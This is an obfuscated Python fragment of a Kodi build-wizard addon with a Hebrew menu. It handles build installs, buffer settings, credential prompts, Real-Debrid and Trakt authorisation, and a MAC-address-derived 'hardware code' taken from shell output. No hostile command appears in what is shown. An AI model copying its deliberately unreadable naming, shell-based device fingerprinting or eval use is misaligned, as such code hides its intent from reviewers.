    OOO00OO00OOOOOOOO =(OOOOOOO00OOOO00O0 [1 ]+OOOOOOO00OOOO00O0 [2 ]+OOOOOOO00OOOO00O0 [5 ]+OOOOOOO00OOOO00O0 [7 ])#line:1643
    OO00O00O0O0O0OO0O =(ADDON .getSetting ("action"))#line:1644
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOO00OO00OOOOOOOO )#line:1647
   except :pass #line:1648
def getHwAddr (OO0O0O00O000OO0OO ):#line:1650
   import subprocess ,time #line:1651
   O00000000O000OO0O ='windows'#line:1652
   if xbmc .getCondVisibility ('system.platform.android'):#line:1653
       O00000000O000OO0O ='android'#line:1654
   if xbmc .getCondVisibility ('system.platform.android'):#line:1655
     O00O00OO0OO00OO0O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1656
     OO0000O000O000OO0 =re .compile ('link/ether (.+?) brd').findall (str (O00O00OO0OO00OO0O ))#line:1658
     O0O0OO0OOO00OO0O0 =0 #line:1659
     for O0OO00OO0000OO000 in OO0000O000O000OO0 :#line:1660
      if OO0000O000O000OO0 !='00:00:00:00:00:00':#line:1661
          OOO00000O00OOO0O0 =O0OO00OO0000OO000 #line:1662
          O0O0OO0OOO00OO0O0 =O0O0OO0OOO00OO0O0 +int (OOO00000O00OOO0O0 .replace (':',''),16 )#line:1663
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1665
       OO000000O0O0O00O0 =0 #line:1666
       O0O0OO0OOO00OO0O0 =0 #line:1667
       O0OO0O000OOOO0OO0 =[]#line:1668
       O0O0000OO0OOOOOO0 =os .popen ("getmac").read ()#line:1669
       O0O0000OO0OOOOOO0 =O0O0000OO0OOOOOO0 .split ("\n")#line:1670
       for OOOO0OOO00OOOO0OO in O0O0000OO0OOOOOO0 :#line:1672
            O00O0O00O00OO0O00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOO0OOO00OOOO0OO ,re .I )#line:1673
            if O00O0O00O00OO0O00 :#line:1674
                OO0000O000O000OO0 =O00O0O00O00OO0O00 .group ().replace ('-',':')#line:1675
                O0OO0O000OOOO0OO0 .append (OO0000O000O000OO0 )#line:1676
                O0O0OO0OOO00OO0O0 =O0O0OO0OOO00OO0O0 +int (OO0000O000O000OO0 .replace (':',''),16 )#line:1679
   else :#line:1681
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1682
   try :#line:1699
    return O0O0OO0OOO00OO0O0 #line:1700
   except :pass #line:1701
def getpass ():#line:1702
	disply_hwr2 ()#line:1704
def setpass ():#line:1705
    OO000O0O0000O0OO0 =xbmcgui .Dialog ()#line:1706
    O0OO0OOOO00OOOO00 =''#line:1707
    O00O0O0O00OOO0O0O =xbmc .Keyboard (O0OO0OOOO00OOOO00 ,'הכנס סיסמה')#line:1709
    O00O0O0O00OOO0O0O .doModal ()#line:1710
    if O00O0O0O00OOO0O0O .isConfirmed ():#line:1711
           O00O0O0O00OOO0O0O =O00O0O0O00OOO0O0O .getText ()#line:1712
    wiz .setS ('pass',str (O00O0O0O00OOO0O0O ))#line:1713
def setuname ():#line:1714
    O0O00000000O00OO0 =''#line:1715
    OO000000000OOO000 =xbmc .Keyboard (O0O00000000O00OO0 ,'הכנס שם משתמש')#line:1716
    OO000000000OOO000 .doModal ()#line:1717
    if OO000000000OOO000 .isConfirmed ():#line:1718
           O0O00000000O00OO0 =OO000000000OOO000 .getText ()#line:1719
           wiz .setS ('user',str (O0O00000000O00OO0 ))#line:1720
def powerkodi ():#line:1721
    os ._exit (1 )#line:1722
def buffer1 ():#line:1724
	O00OOOO000OO00O0O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1725
	OO0OOO000O0O00OOO =xbmc .getInfoLabel ("System.Memory(total)")#line:1726
	OO0OOO0OOO00000OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1727
	O0000OO00OO0O000O =re .sub ('[^0-9]','',OO0OOO0OOO00000OO )#line:1728
	O0000OO00OO0O000O =int (O0000OO00OO0O000O )/3 #line:1729
	O00O000000OOO0OO0 =O0000OO00OO0O000O *1024 *1024 #line:1730
	try :O00O0OOO00000OOOO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1731
	except :O00O0OOO00000OOOO =16 #line:1732
	OO00O0OOOOO0000O0 =DIALOG .yesno ('FREE MEMORY: '+str (OO0OOO0OOO00000OO ),'Based on your free Memory your optimal buffersize is: '+str (O0000OO00OO0O000O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1735
	if OO00O0OOOOO0000O0 ==1 :#line:1736
		with open (O00OOOO000OO00O0O ,"w")as O0OO0000OOO0O00O0 :#line:1737
			if O00O0OOO00000OOOO >=17 :OOOOO0OO00OOOOOO0 =xml_data_advSettings_New (str (O00O000000OOO0OO0 ))#line:1738
			else :OOOOO0OO00OOOOOO0 =xml_data_advSettings_old (str (O00O000000OOO0OO0 ))#line:1739
			O0OO0000OOO0O00O0 .write (OOOOO0OO00OOOOOO0 )#line:1741
			DIALOG .ok ('Buffer Size Set to: '+str (O00O000000OOO0OO0 ),'Please restart Kodi for settings to apply.','')#line:1742
	elif OO00O0OOOOO0000O0 ==0 :#line:1744
		O00O000000OOO0OO0 =_OOO000OOOO0O000OO (default =str (O00O000000OOO0OO0 ),heading ="INPUT BUFFER SIZE")#line:1745
		with open (O00OOOO000OO00O0O ,"w")as O0OO0000OOO0O00O0 :#line:1746
			if O00O0OOO00000OOOO >=17 :OOOOO0OO00OOOOOO0 =xml_data_advSettings_New (str (O00O000000OOO0OO0 ))#line:1747
			else :OOOOO0OO00OOOOOO0 =xml_data_advSettings_old (str (O00O000000OOO0OO0 ))#line:1748
			O0OO0000OOO0O00O0 .write (OOOOO0OO00OOOOOO0 )#line:1749
			DIALOG .ok ('Buffer Size Set to: '+str (O00O000000OOO0OO0 ),'Please restart Kodi for settings to apply.','')#line:1750
def xml_data_advSettings_old (OO0OO0O00O0OOO0OO ):#line:1751
	OOOOOO000O000OO0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0OO0O00O0OOO0OO #line:1761
	return OOOOOO000O000OO0O #line:1762
def xml_data_advSettings_New (OOO0OOO000OOO0OO0 ):#line:1764
	O0000000OO0O000O0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0OOO000OOO0OO0 #line:1776
	return O0000000OO0O000O0 #line:1777
def write_ADV_SETTINGS_XML (O000OO00O0OO000O0 ):#line:1778
    if not os .path .exists (xml_file ):#line:1779
        with open (xml_file ,"w")as OOO00OOOO00OO0O0O :#line:1780
            OOO00OOOO00OO0O0O .write (xml_data )#line:1781
def _OOO000OOOO0O000OO (default ="",heading ="",hidden =False ):#line:1782
    ""#line:1783
    O0OO0OO000OO00O00 =xbmc .Keyboard (default ,heading ,hidden )#line:1784
    O0OO0OO000OO00O00 .doModal ()#line:1785
    if (O0OO0OO000OO00O00 .isConfirmed ()):#line:1786
        return unicode (O0OO0OO000OO00O00 .getText (),"utf-8")#line:1787
    return default #line:1788
def index ():#line:1790
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1791
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1792
	if AUTOUPDATE =='Yes':#line:1793
		if wiz .workingURL (WIZARDFILE )==True :#line:1794
			OO0O0O00OOO0OO0O0 =wiz .checkWizard ('version')#line:1795
			if OO0O0O00OOO0OO0O0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO0O0O00OOO0OO0O0 ),'wizardupdate',themeit =THEME2 )#line:1796
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1797
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1798
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1799
	if len (BUILDNAME )>0 :#line:1800
		O0O0O00O00OO0OOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:1801
		O0000O0O0OOOO00OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1802
		if O0O0O00O00OO0OOO0 >BUILDVERSION :O0000O0O0OOOO00OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0000O0O0OOOO00OO ,O0O0O00O00OO0OOO0 )#line:1803
		addDir (O0000O0O0OOOO00OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1805
		try :#line:1807
		     O000O0O00OOOOOOOO =wiz .themeCount (BUILDNAME )#line:1808
		except :#line:1809
		   O000O0O00OOOOOOOO =False #line:1810
		if not O000O0O00OOOOOOOO ==False :#line:1811
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1812
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1813
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1816
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1817
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1818
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1822
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1824
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1826
def morsetup ():#line:1828
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1829
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1830
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1831
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1832
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1836
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1837
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1840
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1841
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1843
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1844
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1852
	setView ('files','viewType')#line:1853
def morsetup2 ():#line:1854
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1855
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1856
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1857
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1858
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1859
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1861
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1862
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1863
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1864
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1865
def fastupdate ():#line:1866
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1867
def forcefastupdate ():#line:1869
			O0OOOO00OOOOOOOOO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1870
			wiz .ForceFastUpDate (ADDONTITLE ,O0OOOO00OOOOOOOOO )#line:1871
def rdsetup ():#line:1875
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1876
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1877
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1878
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1879
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1880
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1881
	setView ('files','viewType')#line:1882
def traktsetup ():#line:1884
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1885
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1888
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1889
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1890
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1891
	setView ('files','viewType')#line:1892
def resolveurlsetup ():#line:1894
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1895
def urlresolversetup ():#line:1896
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1897
def placentasetup ():#line:1899
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1900
def reptiliasetup ():#line:1901
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1902
def flixnetsetup ():#line:1903
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1904
def yodasetup ():#line:1905
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1906
def numberssetup ():#line:1907
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1908
def uranussetup ():#line:1909
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1910
def genesissetup ():#line:1911
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1912
def net_tools (view =None ):#line:1914
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1915
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1916
	setView ('files','viewType')#line:1918
def speedMenu ():#line:1919
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1920
def viewIP ():#line:1921
	O000O00OOOO000O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1935
	O00O00O00O0O0000O =[];OO00O0O0O0O000OOO =0 #line:1936
	for O0OO0O0O0O0O0OOOO in O000O00OOOO000O00 :#line:1937
		OOOOOOO0O00000OOO =wiz .getInfo (O0OO0O0O0O0O0OOOO )#line:1938
		O0O0O0OO00OO0OOOO =0 #line:1939
		while OOOOOOO0O00000OOO =="Busy"and O0O0O0OO00OO0OOOO <10 :#line:1940
			OOOOOOO0O00000OOO =wiz .getInfo (O0OO0O0O0O0O0OOOO );O0O0O0OO00OO0OOOO +=1 ;wiz .log ("%s sleep %s"%(O0OO0O0O0O0O0OOOO ,str (O0O0O0OO00OO0OOOO )));xbmc .sleep (1000 )#line:1941
		O00O00O00O0O0000O .append (OOOOOOO0O00000OOO )#line:1942
		OO00O0O0O0O000OOO +=1 #line:1943
	OOO0OOO0OO0O0OO0O ,OO0OOO0O000O0OO00 ,O0OO00OO000O0O0O0 =getIP ()#line:1944
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O00O0O0000O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1945
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOO0OO0O0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1946
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0O000O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1947
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00OO000O0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1948
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O00O0O0000O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1949
	setView ('files','viewType')#line:1950
def buildMenu ():#line:1952
	if USERNAME =='':#line:1953
		ADDON .openSettings ()#line:1954
		sys .exit ()#line:1955
	if PASSWORD =='':#line:1956
		ADDON .openSettings ()#line:1957
	O0O00O00OO00OOO0O =u_list (SPEEDFILE )#line:1958
	(O0O00O00OO00OOO0O )#line:1959
	OOOOOO0O0000000OO =(wiz .workingURL (O0O00O00OO00OOO0O ))#line:1960
	(OOOOOO0O0000000OO )#line:1961
	OOOOOO0O0000000OO =wiz .workingURL (SPEEDFILE )#line:1962
	if not OOOOOO0O0000000OO ==True :#line:1963
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1964
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1965
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1966
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1967
		addFile ('%s'%OOOOOO0O0000000OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1968
	else :#line:1969
		OO00O00OOOO00000O ,OO000O0OOO0O000OO ,O00OO0O00OOO0OOOO ,OO00O000OO0OOOOOO ,O0O00000O000OO0OO ,O00O0OOOOO000O00O ,O0O00OOO0OOOOOOO0 =wiz .buildCount ()#line:1970
		O0O0O0O00OO00OO0O =False ;O0OO0OO00OOO0O0OO =[]#line:1971
		if THIRDPARTY =='true':#line:1972
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0O0O00OO00OO0O =True ;O0OO0OO00OOO0O0OO .append ('1')#line:1973
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0O0O00OO00OO0O =True ;O0OO0OO00OOO0O0OO .append ('2')#line:1974
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0O0O00OO00OO0O =True ;O0OO0OO00OOO0O0OO .append ('3')#line:1975
		O0O0000O0OOOOO0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1976
		OOOOO0000000000OO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0000O0OOOOO0OO )#line:1977
		if OO00O00OOOO00000O ==1 and O0O0O0O00OO00OO0O ==False :#line:1978
			for OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ,OO000OO00OO00000O ,OOOOOOO000O000OOO ,O0OOOOOOOO0000000 ,OOOOO0000000OOOO0 ,O00OO000O0OO0000O ,OOO0OO0OOO000O000 ,OO000O000O000O000 ,O00OO000OOO0O000O in OOOOO0000000000OO :#line:1979
				if not SHOWADULT =='true'and OO000O000O000O000 .lower ()=='yes':continue #line:1980
				if not DEVELOPER =='true'and wiz .strTest (OOO0000O00O00OO00 ):continue #line:1981
				viewBuild (OOOOO0000000000OO [0 ][0 ])#line:1982
				return #line:1983
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1986
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1987
		if O0O0O0O00OO00OO0O ==True :#line:1988
			for O000O00OO000OO000 in O0OO0OO00OOO0O0OO :#line:1989
				OOO0000O00O00OO00 =eval ('THIRD%sNAME'%O000O00OO000OO000 )#line:1990
		if len (OOOOO0000000000OO )>=1 :#line:1992
			if SEPERATE =='true':#line:1993
				for OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ,OO000OO00OO00000O ,OOOOOOO000O000OOO ,O0OOOOOOOO0000000 ,OOOOO0000000OOOO0 ,O00OO000O0OO0000O ,OOO0OO0OOO000O000 ,OO000O000O000O000 ,O00OO000OOO0O000O in OOOOO0000000000OO :#line:1994
					if not SHOWADULT =='true'and OO000O000O000O000 .lower ()=='yes':continue #line:1995
					if not DEVELOPER =='true'and wiz .strTest (OOO0000O00O00OO00 ):continue #line:1996
					OO0O0OO0O0OO0O000 =createMenu ('install','',OOO0000O00O00OO00 )#line:1997
					addDir ('[%s] %s (v%s)'%(float (O0OOOOOOOO0000000 ),OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ),'viewbuild',OOO0000O00O00OO00 ,description =O00OO000OOO0O000O ,fanart =OOO0OO0OOO000O000 ,icon =O00OO000O0OO0000O ,menu =OO0O0OO0O0OO0O000 ,themeit =THEME2 )#line:1998
			else :#line:1999
				if OO00O000OO0OOOOOO >0 :#line:2000
					O00OOO00OO0O0000O ='+'if SHOW17 =='false'else '-'#line:2001
					if SHOW17 =='true':#line:2003
						for OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ,OO000OO00OO00000O ,OOOOOOO000O000OOO ,O0OOOOOOOO0000000 ,OOOOO0000000OOOO0 ,O00OO000O0OO0000O ,OOO0OO0OOO000O000 ,OO000O000O000O000 ,O00OO000OOO0O000O in OOOOO0000000000OO :#line:2005
							if not SHOWADULT =='true'and OO000O000O000O000 .lower ()=='yes':continue #line:2006
							if not DEVELOPER =='true'and wiz .strTest (OOO0000O00O00OO00 ):continue #line:2007
							OO000OOOO000OO0O0 =int (float (O0OOOOOOOO0000000 ))#line:2008
							if OO000OOOO000OO0O0 ==17 :#line:2009
								OO0O0OO0O0OO0O000 =createMenu ('install','',OOO0000O00O00OO00 )#line:2010
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOOO0000000 ),OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ),'viewbuild',OOO0000O00O00OO00 ,description =O00OO000OOO0O000O ,fanart =OOO0OO0OOO000O000 ,icon =O00OO000O0OO0000O ,menu =OO0O0OO0O0OO0O000 ,themeit =THEME2 )#line:2011
				if O0O00000O000OO0OO >0 :#line:2012
					O00OOO00OO0O0000O ='+'if SHOW18 =='false'else '-'#line:2013
					if SHOW18 =='true':#line:2015
						for OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ,OO000OO00OO00000O ,OOOOOOO000O000OOO ,O0OOOOOOOO0000000 ,OOOOO0000000OOOO0 ,O00OO000O0OO0000O ,OOO0OO0OOO000O000 ,OO000O000O000O000 ,O00OO000OOO0O000O in OOOOO0000000000OO :#line:2017
							if not SHOWADULT =='true'and OO000O000O000O000 .lower ()=='yes':continue #line:2018
							if not DEVELOPER =='true'and wiz .strTest (OOO0000O00O00OO00 ):continue #line:2019
							OO000OOOO000OO0O0 =int (float (O0OOOOOOOO0000000 ))#line:2020
							if OO000OOOO000OO0O0 ==18 :#line:2021
								OO0O0OO0O0OO0O000 =createMenu ('install','',OOO0000O00O00OO00 )#line:2022
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOOO0000000 ),OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ),'viewbuild',OOO0000O00O00OO00 ,description =O00OO000OOO0O000O ,fanart =OOO0OO0OOO000O000 ,icon =O00OO000O0OO0000O ,menu =OO0O0OO0O0OO0O000 ,themeit =THEME2 )#line:2023
				if O00OO0O00OOO0OOOO >0 :#line:2024
					O00OOO00OO0O0000O ='+'if SHOW16 =='false'else '-'#line:2025
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O00OOO00OO0O0000O ,O00OO0O00OOO0OOOO ),'togglesetting','show16',themeit =THEME3 )#line:2026
					if SHOW16 =='true':#line:2027
						for OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ,OO000OO00OO00000O ,OOOOOOO000O000OOO ,O0OOOOOOOO0000000 ,OOOOO0000000OOOO0 ,O00OO000O0OO0000O ,OOO0OO0OOO000O000 ,OO000O000O000O000 ,O00OO000OOO0O000O in OOOOO0000000000OO :#line:2028
							if not SHOWADULT =='true'and OO000O000O000O000 .lower ()=='yes':continue #line:2029
							if not DEVELOPER =='true'and wiz .strTest (OOO0000O00O00OO00 ):continue #line:2030
							OO000OOOO000OO0O0 =int (float (O0OOOOOOOO0000000 ))#line:2031
							if OO000OOOO000OO0O0 ==16 :#line:2032
								OO0O0OO0O0OO0O000 =createMenu ('install','',OOO0000O00O00OO00 )#line:2033
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOOO0000000 ),OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ),'viewbuild',OOO0000O00O00OO00 ,description =O00OO000OOO0O000O ,fanart =OOO0OO0OOO000O000 ,icon =O00OO000O0OO0000O ,menu =OO0O0OO0O0OO0O000 ,themeit =THEME2 )#line:2034
				if OO000O0OOO0O000OO >0 :#line:2035
					O00OOO00OO0O0000O ='+'if SHOW15 =='false'else '-'#line:2036
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O00OOO00OO0O0000O ,OO000O0OOO0O000OO ),'togglesetting','show15',themeit =THEME3 )#line:2037
					if SHOW15 =='true':#line:2038
						for OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ,OO000OO00OO00000O ,OOOOOOO000O000OOO ,O0OOOOOOOO0000000 ,OOOOO0000000OOOO0 ,O00OO000O0OO0000O ,OOO0OO0OOO000O000 ,OO000O000O000O000 ,O00OO000OOO0O000O in OOOOO0000000000OO :#line:2039
							if not SHOWADULT =='true'and OO000O000O000O000 .lower ()=='yes':continue #line:2040
							if not DEVELOPER =='true'and wiz .strTest (OOO0000O00O00OO00 ):continue #line:2041
							OO000OOOO000OO0O0 =int (float (O0OOOOOOOO0000000 ))#line:2042
							if OO000OOOO000OO0O0 <=15 :#line:2043
								OO0O0OO0O0OO0O000 =createMenu ('install','',OOO0000O00O00OO00 )#line:2044
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOOO0000000 ),OOO0000O00O00OO00 ,OOOO000O00OOO0OOO ),'viewbuild',OOO0000O00O00OO00 ,description =O00OO000OOO0O000O ,fanart =OOO0OO0OOO000O000 ,icon =O00OO000O0OO0000O ,menu =OO0O0OO0O0OO0O000 ,themeit =THEME2 )#line:2045
		elif O0O00OOO0OOOOOOO0 >0 :#line:2046
			if O00O0OOOOO000O00O >0 :#line:2047
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2048
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
			else :#line:2050
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2051
